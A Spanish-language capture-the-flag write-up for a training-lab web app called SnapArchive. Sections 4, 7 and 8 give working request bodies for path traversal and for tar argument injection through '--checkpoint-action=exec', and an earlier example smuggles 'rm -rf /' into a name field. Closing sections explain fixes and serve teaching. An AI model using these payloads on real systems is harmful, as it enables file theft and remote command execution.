---
title: 'SnapArchive: Writeup completo'
description: 'Path Traversal en la creación de backups de SnapArchive escala a Argument Injection en tar (RCE) hasta la flag guardada en una variable de entorno.'
event: 'FlagYard (Training Labs)'
category: 'web'
difficulty: 'easy'
tags:
  - path-traversal
  - argument-injection
  - tar
  - rce
  - gtfobins
pubDate: 2026-08-25
author: 'Niedson'
draft: false
---

> [!NOTE/Sobre el desafío]
> **Plataforma:** FlagYard (Training Labs)
> **Categoría:** Web · **Dificultad:** Easy · **Puntos:** 120
> **Vulnerabilidades:** Path Traversal (lectura arbitraria de archivos) → escalada a **Argument Injection en `tar`** (ejecución remota de comandos)
> **Flag:** `FlagY{...}` (dinámica: cambia en cada instancia)

Este writeup está escrito desde cero: aunque nunca hayas oído hablar de un CTF, de "path traversal" o de "command injection", la idea es que al final entiendas **por qué** se dio cada paso y **cómo** razonamos hasta llegar a la flag.

---

## 1. Contexto: ¿de qué va todo esto?

### 1.1. Qué es un CTF

Un **CTF** (_Capture The Flag_) es una competencia de seguridad de la información. Cada desafío esconde una **flag**: un texto secreto con un formato específico (aquí, `FlagY{...}`): dentro de un sistema deliberadamente vulnerable. Tu trabajo es encontrar y explotar el fallo para "capturar" esa flag y demostrar que resolviste el desafío.

En los desafíos de la categoría **Web**, el objetivo es una aplicación web: un sitio corriendo en un servidor. Interactúas con él como un usuario normal (o no tan normal) y buscas brechas en la forma en que procesa tus peticiones.

### 1.2. El desafío: SnapArchive

SnapArchive se describe a sí mismo como un _"Personal document backup & archiving service"_: un servicio de backup y archivado de documentos personales. La aplicación (versión 1.4.2) tiene cuatro funciones en pantalla:

1. **Add a document**: escribes un _nombre de archivo_ y un _contenido_ de texto, y lo envías. El documento queda guardado en tu "almacenamiento personal".
2. **Your documents**: lista los documentos que ya enviaste, con casillas de selección.
3. **Create backup**: eliges algunos documentos (marcando las casillas), le das un nombre al backup, y el servidor **empaqueta** esos documentos en un archivo comprimido para descargar.
4. **Backup archives**: lista los backups creados, con un enlace para descargar cada uno.

Presta atención a la función 3: **empaquetar archivos**. Es la pieza central de todo.

---

## 2. Los conceptos de vulnerabilidad (explicados desde cero)

Antes de tocar el objetivo, entendamos las dos hipótesis de fallo que una aplicación así naturalmente plantea. Ellas guiaron toda la investigación.

### 2.1. Hipótesis A: Path Traversal (en el nombre del archivo)

**La idea central.** Los sistemas de archivos se organizan en carpetas (directorios). Una ruta como `/tmp/data/uploads/notas.txt` describe "entra en `tmp`, luego en `data`, luego en `uploads`, y toma `notas.txt`".

Existe un atajo especial: `..` significa **"sube un nivel"**. Entonces:

```
/tmp/data/uploads/../  →  /tmp/data/
/tmp/data/uploads/../../  →  /tmp/
/tmp/data/uploads/../../../  →  /   (la raíz del sistema)
```

**Dónde está el peligro.** Imagina que la aplicación siempre guarda/lee archivos dentro de una carpeta "segura", tipo `/tmp/data/uploads/`, y arma la ruta pegando el nombre que **tú** proporcionaste:

```
ruta_final = "/tmp/data/uploads/" + nombre_del_archivo
```

Si el programador confía ciegamente en `nombre_del_archivo` y envías algo como:

```
../../../etc/passwd
```

la ruta final queda:

```
/tmp/data/uploads/../../../etc/passwd   →   /etc/passwd
```

Es decir, "escapaste" de la carpeta segura y alcanzaste un archivo del sistema (`/etc/passwd`, un archivo clásico de Linux que lista los usuarios). Esto es **Path Traversal** (también llamado _Directory Traversal_): usar `../` para leer (o escribir) archivos fuera de la carpeta prevista.

En un servicio de backup, el vector natural es el **nombre del archivo** o la **lista de archivos elegidos para el backup**: si logro que el servidor incluya `../../../etc/passwd` en el paquete, descargo el paquete y leo el contenido.

### 2.2. Hipótesis B: Command / Argument Injection (en la creación del backup)

**Cómo "empaquetan" archivos los programas.** Para juntar varios archivos en uno solo (un `.zip` o `.tar.gz`), la forma más perezosa y común es que el servidor invoque un **programa externo** de línea de comandos, como `tar` o `zip`. Por ejemplo:

```
tar -czf backup.tar.gz arquivo1.txt arquivo2.txt
```

Aquí `tar` es el programa, y el resto son **argumentos**: `-czf` es una opción (create, gzip, file), `backup.tar.gz` es el nombre de salida, y los `.txt` son los archivos a incluir.

**Command Injection (inyección de comandos).** Si el servidor construye ese comando pegando texto tuyo **dentro de un shell** (el intérprete de línea de comandos), los caracteres especiales se convierten en armas. En el shell, `;` separa comandos, `|` encadena, `$(...)` y las comillas invertidas ejecutan subcomandos. Entonces un nombre de backup como:

```
meu-backup; rm -rf /
```

podría convertirse en dos comandos: el `tar` **y** un `rm -rf /`. Esto es **Command Injection**: hacer que el servidor ejecute comandos que tú elegiste.

**Argument Injection (inyección de argumentos): más sutil y crucial aquí.** Incluso si el servidor es cuidadoso y **no** usa un shell (pasando cada trozo como argumento separado, sin interpretar `;` ni `$()`), todavía puede haber un problema: si tu texto se convierte en un **argumento** del programa, puedes inyectar **opciones** que el programa acepta.

Muchos programas de línea de comandos tienen opciones peligrosas. `tar`, por ejemplo, tiene la opción `--checkpoint-action=exec=COMANDO`, que hace que el propio `tar` **ejecute un comando** durante el empaquetado. Si logro colar `--checkpoint-action=exec=...` en la lista de argumentos, `tar` ejecuta mi comando: sin necesitar ningún `;` ni `$()`. Esto está catalogado en [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), un repositorio de "trucos" con binarios de Unix.

> [!TIP/Resumen de las hipótesis]
> O escapo de la carpeta con `../` para **leer** archivos (A), o abuso del `tar`/`zip` de la creación de backups para **ejecutar** algo (B). Al final veremos que el desafío exige **combinar ambas ideas**.

---

## 3. Reconocimiento (entendiendo el objetivo)

Todo ataque empieza mapeando cómo funciona la aplicación por debajo. Abriendo la aplicación e inspeccionando el JavaScript de la página, descubrimos que el front-end habla con tres **endpoints** de API (URLs que responde el servidor):

| Endpoint      | Método     | Función                    |
| ------------- | ---------- | -------------------------- |
| `/api/files`  | GET / POST | Listar y enviar documentos |
| `/api/backup` | GET / POST | Listar y crear backups     |
| `/api/info`   | GET        | Estado del servicio        |

El primer tesoro vino de `/api/info`:

```json
{
  "success": true,
  "service": "SnapArchive",
  "version": "1.4.2",
  "storage": {
    "uploadsDir": "/tmp/data/uploads",
    "backupsDir": "/tmp/data/backups",
    "uploadedFiles": 1,
    "backupArchives": 0
  }
}
```

Esto nos entregó **las rutas reales en el servidor**:

- Los documentos están en `/tmp/data/uploads`
- Los backups están en `/tmp/data/backups`

Saber que la "carpeta segura" es `/tmp/data/uploads` es oro puro: ahora sé exactamente cuántos `../` necesito para llegar a la raíz `/` del sistema (tres: `uploads` → `data` → `tmp` → `/`).

Al listar los documentos (`GET /api/files`), había un `readme.txt` ya presente. Y `GET /api/backup` mostraba la lista de backups (vacía). Al **crear** un backup de prueba, la respuesta reveló el mecanismo:

```json
{
  "success": true,
  "message": "Backup created successfully.",
  "archive": {
    "name": "backup-1787633214598.tar.gz",
    "path": "/tmp/data/backups/backup-1787633214598.tar.gz",
    "sizeBytes": 244
  }
}
```

Dos hechos importantes:

1. El backup es un **`.tar.gz`** → casi con seguridad el servidor usa el programa **`tar`** (esto conecta directo con la Hipótesis B).
2. El nombre del archivo se genera automáticamente (`backup-<timestamp>.tar.gz`), ignorando el nombre que envié.

¿Y la descarga? Inspeccionando el front-end, el enlace de descarga es:

```
GET /api/backup/<nombre-del-archivo>
```

Entonces el flujo de ataque para **leer** un archivo cualquiera sería: _hacer que el servidor lo incluya en un backup → descargar el `.tar.gz` → descomprimir → leer el contenido._

---

## 4. Probando la Hipótesis A: Path Traversal

La pregunta ahora es directa: **¿se valida la lista de archivos elegidos para el backup?** Si envío `../../../../etc/passwd` como si fuera uno de los "documentos seleccionados", ¿el servidor lo rechaza o lo obedece?

La creación de backup es un `POST /api/backup` con un cuerpo JSON así:

```json
{ "name": "meu-backup", "files": ["readme.txt"] }
```

El campo `files` es la lista de documentos. Vamos a abusar de él. Probando varias rutas:

```javascript
// Cada intento crea un backup pidiendo incluir una ruta "escapada"
POST /api/backup   { "name": "t", "files": ["../../../../etc/passwd"] }   // → 200 OK ✅
POST /api/backup   { "name": "t", "files": ["../../../flag"] }           // → 502 (no existe) ❌
POST /api/backup   { "name": "t", "files": ["/flag"] }                   // → 502 ❌
```

**`../../../../etc/passwd` funcionó** (generó un `.tar.gz` de 454 bytes), mientras que rutas inexistentes daban error `502`. Es decir: **el path traversal existe**. El servidor no valida los nombres: los pasa directo a `tar`.

Para confirmarlo, descargamos el `.tar.gz` generado y lo descomprimimos (esto se puede hacer desde el propio navegador con la API `DecompressionStream` y un pequeño parser del formato `tar`). Resultado:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
bun:x:1000:1000:...:/home/bun:/bin/bash
```

¡Logramos leer `/etc/passwd`! Esto confirma **lectura arbitraria de archivos**. Nota el usuario `bun` (uid 1000): la aplicación corre con el runtime **Bun** (un entorno JavaScript/TypeScript, alternativa a Node.js).

> [!NOTE/Detalle técnico de tar]
> Cuando `tar` recibe una ruta con `../`, guarda el archivo en el paquete quitando los `../` del principio (por eso la entrada aparece como `etc/passwd`). El contenido, sin embargo, es el del archivo real. Y como `tar` **entra recursivamente en directorios**, incluso se puede pedir una carpeta entera y listar su contenido: así fue como mapeamos el sistema (ver la sección 6).

---

## 5. Confirmando desde la fuente: leyendo el código del servidor

Como ahora tenemos lectura arbitraria, podemos leer **el propio código fuente de la aplicación** y entender exactamente qué ocurre. Usando el mismo truco de traversal, pedimos la carpeta `/app`:

```
app/run
app/package.json
app/public/index.html
app/src/server.ts
app/src/http-core.ts       ← la lógica principal
app/src/jail-server.ts
```

En `http-core.ts`, encontramos el corazón de la función de backup:

```typescript
import { $ } from 'bun'; // el "shell" de Bun

// ... más adelante, dentro del handler de /api/backup:

// (comentario real del código:)
// "there was never a reported case of anyone typing a filename by hand
//  instead of clicking a checkbox, so stricter validation was de-scoped
//  for the v1.4 release."
for (const f of files) {
  if (typeof f !== 'string' || f.length === 0 || f.length > 300) {
    return badRequest("Each entry in 'files' must be a non-empty string (max 300 chars).");
  }
}

const archiveName = `${archiveBase}.tar.gz`;
const archivePath = path.join(BACKUP_DIR, archiveName);

// LA LÍNEA VULNERABLE:
await $`tar -czf ${archivePath} -C ${UPLOAD_DIR} ${files}`.quiet();
```

Vamos a diseccionar esta línea, porque explica **todo**:

```
tar -czf <archivePath> -C /tmp/data/uploads <files...>
```

- `-c` crea un archivo, `-z` comprime con gzip, `-f <archivePath>` define el archivo de salida.
- `-C /tmp/data/uploads` le dice a `tar`: "cambia a esta carpeta antes de tomar los archivos".
- `<files...>` son los nombres que **yo** envié: cada elemento de la lista `files` se convierte en **un argumento separado**.

¿Y la validación? Solo comprueba que cada elemento sea una cadena de 1 a 300 caracteres. **Ninguna comprobación de `../`, `/` ni de opciones.** El propio comentario en el código admite que "la validación más estricta se sacó de alcance en la versión 1.4". Esto confirma la Hipótesis A de forma cristalina.

### ¿Y la Hipótesis B (command injection clásico)?

Fíjate en el `$\`...\``de Bun. La plantilla`$` de Bun es un **shell seguro**: **escapa automáticamente** cada valor interpolado. Es decir, si pongo `; id` o `$(id)`en un nombre, Bun lo trata como texto literal, no como comandos. Probamos varios payloads con`;`, `|`, `$()`, comillas invertidas: **todos fallaron**. No hay command injection vía metacaracteres de shell aquí.

Parece un callejón sin salida para la Hipótesis B... pero no lo es. Guarda esta observación: **cada elemento de `files` se convierte en un argumento de `tar`, y no hay un `--` separando las opciones de los archivos.** Volveremos a esto.

---

## 6. El giro: la flag no es un archivo común

Con lectura arbitraria en mano, lo más obvio es buscar la flag como archivo. Probamos exhaustivamente los lugares clásicos:

```
/flag        /flag.txt      /flag.md      /flag.json
/app/flag.txt   /home/bun/flag.txt   /tmp/flag   /root/flag.txt
/etc/flag       /var/flag.txt   /srv/flag.txt   ...
```

**Ninguno existía.** También mapeamos el sistema pidiéndole directorios enteros a `tar` (que recorre carpetas):

- `/app`, `/home/bun`, `/tmp`, `/opt` → listados, **sin flag**.
- `/etc`, `/var`, `/usr` → **fallaban por completo**. Motivo: si dentro de la carpeta hay **un** archivo que el usuario `bun` no tiene permiso de leer (por ejemplo `/etc/shadow`), `tar` aborta con error y el backup entero falla (`502`). Esto nos impide _listar_ esas carpetas, aunque todavía podríamos leer un archivo específico de ellas si supiéramos el nombre.

También confirmamos que `/etc/passwd` solo tenía usuarios estándar de Debian + `bun`, sin ningún usuario/home sospechoso escondiendo la flag.

**Conclusión parcial:** la flag **no está en el disco** (al menos no con un nombre adivinable y legible). Esta es una elección de diseño común en los desafíos: la flag es **dinámica**, generada por instancia e inyectada de otra forma: típicamente como una **variable de entorno**.

Y aquí está el problema: las variables de entorno de un proceso en Linux están en `/proc/<pid>/environ`. Intentamos leer ese archivo vía traversal... y volvió **vacío (0 bytes)**. ¿Por qué? Los archivos dentro de `/proc` son "virtuales": `tar` consulta el tamaño del archivo antes de leerlo, el kernel reporta tamaño `0` para esos archivos, y `tar` concluye que no hay nada que copiar. Es decir: **el path traversal con `tar` no puede leer variables de entorno.**

Necesitamos algo más poderoso que "leer archivos". Necesitamos **ejecutar comandos**.

---

## 7. Escalando a RCE: Argument Injection en `tar`

Aquí se encuentran las dos hipótesis. ¿Recuerdas la observación del final de la sección 5?

> [!IMPORTANT/Punto clave]
> Cada elemento de `files` se convierte en un argumento de `tar`, y **no hay un `--`** separando las opciones de los nombres de archivo.

En los programas de línea de comandos de Unix, `--` es un marcador que significa "se acabaron las opciones; todo lo que viene después es un nombre de archivo, aunque empiece con `-`". Como el comando de SnapArchive es:

```
tar -czf <salida> -C /tmp/data/uploads <files...>
```

sin ningún `--` antes de `<files...>`, `tar` va a **interpretar como opción** cualquier elemento de mi lista que empiece con `-` o `--`. Y yo controlo el 100% de esa lista.

`tar` tiene justamente un dúo de opciones peligrosas (el truco de GTFOBins):

- `--checkpoint=1`: hace que `tar` emita un "checkpoint" en cada registro procesado.
- `--checkpoint-action=exec=COMANDO`: **ejecuta `COMANDO` en cada checkpoint**.

Combinando: si paso esas dos opciones como si fueran "archivos", `tar` ejecuta un comando mío. Y lo más elegante: esto **no depende de metacaracteres de shell**, así que el escape automático de Bun (que bloqueó el command injection clásico) **no protege contra esto**: son argumentos perfectamente legítimos de `tar`.

### El payload

Enviamos a `POST /api/backup` la siguiente lista de `files`:

```json
{
  "name": "x",
  "files": [
    "--checkpoint=1",
    "--checkpoint-action=exec=id > /tmp/data/uploads/rce.txt 2>&1",
    "readme.txt"
  ]
}
```

Lo que hace cada elemento:

- `--checkpoint=1` → dispara un checkpoint en el primer registro.
- `--checkpoint-action=exec=id > /tmp/data/uploads/rce.txt 2>&1` → hace que `tar` ejecute `id` y guarde la salida dentro de la carpeta de uploads (¡que puedo volver a leer!).
- `readme.txt` → un archivo real, para que `tar` tenga algo que empaquetar y llegue de hecho a un checkpoint.

El comando de `--checkpoint-action=exec=` se entrega a un shell por el propio `tar` (vía `system()`), así que redirecciones como `>` y `2>&1` funcionan normalmente. Por eso guardamos la salida en un archivo dentro de `/tmp/data/uploads`: así se convierte en un "documento" que podemos descargar después.

Resultado: el backup devolvió éxito y, al listar los documentos (`GET /api/files`), ahí estaba el **`rce.txt`**. Leyendo su contenido (de nuevo vía backup + descarga):

```
uid=1000(bun) gid=1000(bun) groups=1000(bun)
```

**Tenemos ejecución remota de comandos (RCE)** como el usuario `bun`. 🎯

> [!TIP/La clave del desafío]
> El path traversal (Hipótesis A) es un señuelo: resuelve "lectura de archivos", pero la flag no es un archivo. El mismo bug de falta de validación (pasar entradas del usuario directo a `tar` sin `--`) permite escalar de "leer archivo" a "ejecutar comando" (Hipótesis B, en forma de _argument injection_). Necesitas las dos ideas.

---

## 8. Capturando la flag

Con RCE, leer variables de entorno es trivial: basta correr `env`. Reutilizamos la técnica, guardando la salida en un archivo legible:

```json
{
  "name": "x",
  "files": [
    "--checkpoint=1",
    "--checkpoint-action=exec=env > /tmp/data/uploads/env.txt 2>&1",
    "readme.txt"
  ]
}
```

Luego descargamos `env.txt`. Contenido (destacando lo importante):

```
TAR_ARCHIVE=/tmp/data/backups/backup-1787634304267.tar.gz
DATA_DIR=/tmp/data
TAR_FORMAT=gnu
DYN_FLAG=FlagY{9f49c4b20d513569a4e362e86340a2b7}      ← 🚩 LA FLAG
TAR_BLOCKING_FACTOR=20
PWD=/app
TAR_CHECKPOINT=1
TAR_VERSION=1.35
TAR_SUBCOMMAND=-c
```

La flag estaba en la variable de entorno **`DYN_FLAG`** (el prefijo `DYN` refuerza que es _dinámica_, generada por instancia). Las variables `TAR_*` también aparecen porque las define el propio `tar` para el proceso de `--checkpoint-action`: un bono que confirma que estamos corriendo dentro del contexto de `tar`.

### 🚩 Flag

```
FlagY{9f49c4b20d513569a4e362e86340a2b7}
```

_(La tuya será distinta, ya que se genera por instancia.)_

---

## 9. Recapitulando la cadena de explotación

```
1. Reconocimiento
   └─ /api/info filtra uploadsDir = /tmp/data/uploads
      → sé exactamente cuántos "../" necesito para llegar a "/"

2. Path Traversal (lectura arbitraria)
   └─ POST /api/backup { files: ["../../../../etc/passwd"] }
      → tar -czf out -C /tmp/data/uploads ../../../../etc/passwd
      → descargo el .tar.gz, descomprimo, leo el archivo
      → leí /etc/passwd y el código fuente en /app

3. Callejón sin salida aparente
   └─ la flag no es un archivo en disco (es una env var)
   └─ /proc/self/environ llega vacío vía tar (archivo virtual, tamaño 0)
      → la lectura de archivos no alcanza; necesito ejecución

4. Argument Injection en tar → RCE
   └─ el comando no tiene "--", así que los elementos de "files" se vuelven OPCIONES de tar
   └─ files: ["--checkpoint=1",
              "--checkpoint-action=exec=<comando> > /tmp/data/uploads/out.txt",
              "readme.txt"]
      → tar ejecuta mi comando; guardo la salida en la carpeta de uploads
      → leo la salida descargándola como backup

5. Captura de la flag
   └─ exec=env  →  DYN_FLAG=FlagY{...}
```

---

## 10. Por qué la aplicación era vulnerable (y cómo corregirlo)

La raíz de todo es **un único fallo**: pasar entradas controladas por el usuario directamente como argumentos de un programa externo, sin validación. El shell de Bun (`$`) protegió contra el _command injection_ clásico (metacaracteres), pero eso dio una falsa sensación de seguridad: no protege contra **path traversal** ni contra **argument injection**.

Cómo corregirlo, en capas:

1. **Validar los nombres de archivo (allow-list).** Aceptar solo nombres simples, por ejemplo, coincidiendo con una expresión como `^[A-Za-z0-9._-]{1,255}$`, **rechazando** cualquier `/`, `..` o nombre que empiece con `-`.
2. **Confirmar que el archivo realmente pertenece al directorio de uploads.** Resolver la ruta absoluta (`realpath`) y verificar que empiece con `/tmp/data/uploads/` antes de usarla.
3. **Usar el separador `--`** en el comando: `tar -czf salida -C /tmp/data/uploads -- archivo1 archivo2`. Esto por sí solo ya mata el _argument injection_, ya que todo lo que va después del `--` se trata como nombre de archivo, nunca como opción.
4. **Preferir una librería en vez de invocar el `tar` externo.** Empaquetar mediante una librería de tar/zip del propio lenguaje elimina toda la superficie de inyección de argumentos de línea de comandos.
5. **Principio de mínimo privilegio.** Correr el proceso con lo mínimo necesario y no dejar secretos (como la flag/credenciales) en variables de entorno del mismo proceso que manipula la entrada del usuario.

---

## 11. Lecciones para llevarse

- **El path traversal** trata sobre el `..`: cualquier lugar donde la aplicación use un nombre/ruta que tú proporciones para acceder al disco es un candidato. Descubrir el directorio base (aquí, vía `/api/info`) hace el ataque preciso.
- **"Sin shell" no es lo mismo que "seguro".** Escapar metacaracteres impide el _command injection_, pero si tu texto se convierte en **argumento** de un binario, todavía puedes inyectar **opciones**: y muchos binarios tienen opciones que ejecutan comandos (`tar --checkpoint-action`, `--to-command`, `--use-compress-program`; `zip -T -TT`, etc.: ver GTFOBins).
- **Usa siempre `--`** al construir comandos con entrada del usuario, y valida el formato de los nombres.
- **Cuando la lectura de archivos no encuentra la flag, piensa en variables de entorno**: y recuerda que `/proc/.../environ` no lo leen las herramientas que confían en el tamaño del archivo (como `tar`); en ese caso hay que escalar a ejecución de comandos.
- **Lee el código fuente cuando puedas.** La lectura arbitraria se convirtió en nuestra mejor herramienta de reconocimiento: el comentario "de-scoped for v1.4" y la línea de `tar` sin `--` entregaron todo el camino.

---

_Writeup del desafío SnapArchive (FlagYard · Web · Easy)._
